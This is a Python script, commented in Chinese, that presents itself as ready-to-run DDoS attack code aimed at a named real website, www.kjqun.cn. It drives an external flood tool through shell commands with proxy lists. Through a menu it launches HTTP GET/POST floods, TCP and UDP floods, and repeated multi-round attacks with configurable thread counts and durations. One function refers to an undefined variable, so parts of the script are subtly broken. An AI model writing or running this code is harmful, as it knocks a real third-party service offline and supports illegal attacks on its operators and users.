#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
针对 https://www.kjqun.cn/ 的DDoS攻击示例
完整可执行的攻击代码
"""

import subprocess
import threading
import time
import sys

class KjqunDDoSAttack:
    """针对爱Q网笔记的DDoS攻击类"""
    
    def __init__(self):
        self.target_url = "https://www.kjqun.cn/"
        self.target_domain = "www.kjqun.cn"
        self.is_running = False
        
    def show_banner(self):
        """显示攻击信息横幅"""
        print("=" * 70)
        print("💥 针对 爱Q网笔记 (https://www.kjqun.cn/) 的DDoS攻击")
        print("=" * 70)
        print(f"目标网站: {self.target_url}")
        print(f"目标域名: {self.target_domain}")
        print("攻击类型: Layer7 HTTP Flood")
        print("=" * 70)
    
    def attack_with_get_method(self, threads=100, duration=60):
        """使用GET方法进行Layer7攻击"""
        print(f"🚀 启动GET方法攻击 - 线程数: {threads}, 持续时间: {duration}秒")
        
        command = f"python start.py GET {self.target_url} 0 {threads} proxies.txt 100 {duration}"
        return self.execute_attack(command, "GET")
    
    def attack_with_post_method(self, threads=80, duration=60):
        """使用POST方法进行Layer7攻击"""
        print(f"🚀 启动POST方法攻击 - 线程数: {threads}, 持续时间: {duration}秒")
        
        command = f"python start.py POST {self.target_url} 0 {threads} proxies.txt 100 {duration}"
        return self.execute_attack(command, "POST")
    
    def attack_with_tcp_method(self, threads=150, duration=60):
        """使用TCP方法进行Layer4攻击"""
        print(f"🚀 启动TCP方法攻击 - 线程数: {threads}, 持续时间: {duration}秒")
        
        command = f"python start.py TCP {self.target_domain}:80 {threads} {duration}"
        return self.execute_attack(command, "TCP")
    
    def attack_with_udp_method(self, threads=200, duration=60):
        """使用UDP方法进行Layer4攻击"""
        print(f"🚀 启动UDP方法攻击 - 线程数: {threads}, 持续时间: {duration}秒")
        
        command = f"python start.py UDP {self.target_domain}:53 {threads} {duration}"
        return self.execute_attack(command, "UDP")
    
    def execute_attack(self, command, attack_type):
        """执行攻击命令"""
        try:
            print(f"📡 执行命令: {command}")
            
            start_time = time.time()
            self.is_running = True
            
            # 执行攻击
            process = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # 实时读取输出
            output_lines = []
            while True:
                # 检查是否超时
                if time.time() - start_time > duration + 10:
                    process.terminate()
                    output_lines.append("⏰ 攻击时间结束，自动停止")
                    break
                
                # 读取输出
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    # 过滤掉警告信息
                    if "DeprecationWarning" not in output and "RequestsDependencyWarning" not in output:
                        output_lines.append(output.strip())
            
            # 检查错误
            stderr = process.stderr.read()
            
            # 显示结果
            print("\n" + "=" * 50)
            print(f"✅ {attack_type}攻击执行完成")
            print("=" * 50)
            
            for line in output_lines:
                if line:
                    print(f"📊 {line}")
            
            if stderr and "DeprecationWarning" not in stderr and "RequestsDependencyWarning" not in stderr:
                print(f"❌ 错误信息: {stderr}")
            
            self.is_running = False
            return True
            
        except Exception as e:
            print(f"❌ 攻击执行异常: {e}")
            self.is_running = False
            return False
    
    def stop_attack(self):
        """停止攻击"""
        if self.is_running:
            print("🛑 正在停止攻击...")
            self.is_running = False
    
    def run_comprehensive_attack(self):
        """运行综合攻击策略"""
        self.show_banner()
        
        print("\n🎯 选择攻击策略:")
        print("1. 快速攻击 (GET方法, 60秒)")
        print("2. 强力攻击 (TCP+UDP组合)")
        print("3. 持续攻击 (多轮攻击)")
        print("4. 自定义攻击")
        
        try:
            choice = input("\n请输入选择 (1-4): ").strip()
            
            if choice == "1":
                # 快速攻击
                return self.attack_with_get_method(threads=100, duration=60)
            
            elif choice == "2":
                # 强力攻击
                print("💪 启动强力攻击组合...")
                
                # TCP攻击
                tcp_success = self.attack_with_tcp_method(threads=150, duration=120)
                
                # UDP攻击
                if tcp_success:
                    time.sleep(5)  # 间隔5秒
                    udp_success = self.attack_with_udp_method(threads=200, duration=120)
                    return tcp_success and udp_success
                
            elif choice == "3":
                # 持续攻击
                print("🔄 启动持续攻击模式...")
                
                rounds = 3
                for i in range(rounds):
                    print(f"\n🌀 第 {i+1}/{rounds} 轮攻击")
                    
                    # 交替使用不同方法
                    if i % 2 == 0:
                        success = self.attack_with_get_method(threads=120, duration=90)
                    else:
                        success = self.attack_with_post_method(threads=100, duration=90)
                    
                    if not success:
                        return False
                    
                    if i < rounds - 1:
                        print("⏳ 等待30秒后继续下一轮攻击...")
                        time.sleep(30)
                
                return True
            
            elif choice == "4":
                # 自定义攻击
                print("🔧 自定义攻击配置:")
                
                method = input("攻击方法 (GET/POST/TCP/UDP): ").strip().upper()
                threads = int(input("线程数 (默认100): ").strip() or "100")
                duration = int(input("持续时间(秒) (默认60): ").strip() or "60")
                
                if method == "GET":
                    return self.attack_with_get_method(threads, duration)
                elif method == "POST":
                    return self.attack_with_post_method(threads, duration)
                elif method == "TCP":
                    return self.attack_with_tcp_method(threads, duration)
                elif method == "UDP":
                    return self.attack_with_udp_method(threads, duration)
                else:
                    print("❌ 不支持的攻击方法")
                    return False
            
            else:
                print("❌ 无效的选择")
                return False
                
        except KeyboardInterrupt:
            print("\n🛑 用户中断攻击")
            self.stop_attack()
            return False
        except Exception as e:
            print(f"❌ 配置错误: {e}")
            return False

def main():
    """主函数"""
    attack = KjqunDDoSAttack()
    
    try:
        success = attack.run_comprehensive_attack()
        
        if success:
            print("\n" + "🎉" * 20)
            print("✅ 攻击任务完成!")
            print("🎉" * 20)
        else:
            print("\n❌ 攻击任务失败或中断")
            
    except KeyboardInterrupt:
        print("\n🛑 程序被用户中断")
    except Exception as e:
        print(f"\n❌ 程序错误: {e}")

if __name__ == "__main__":
    main()